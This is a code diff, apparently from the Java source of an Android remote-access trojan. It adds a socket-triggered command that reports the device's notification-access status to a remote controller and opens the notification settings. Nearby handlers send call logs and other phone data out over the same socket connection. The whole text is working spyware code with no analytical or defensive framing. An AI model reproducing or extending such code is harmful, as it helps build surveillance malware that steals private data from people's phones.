@@ -172,7 +172,12 @@ try {
                     case "x0000lm":
                         x0000lm();
                         break;
-
+                    case "x0000nf":
+                        if(data.getString("extra").equals("status"))
+                            x0000nf(0);
+                        else if(data.getString("extra").equals("openSettings"))
+                            x0000nf(1);
+                        break;
 
                 }
 
@@ -225,7 +230,16 @@ try {
             ioSocket.emit("x0000sm", isSent);
         }
     }
-
+    public static void x0000nf(int req){
+        if(req == 0) {
+            // Get status
+            ioSocket.emit("x0000nf", NotificationManager.getNotificationStatus(context));
+        }
+        else if (req == 1) {
+            // Open settings
+            NotificationManager.openNotificationSettings(context);
+        }
+    }
     public static void x0000cl(){
         ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
     }
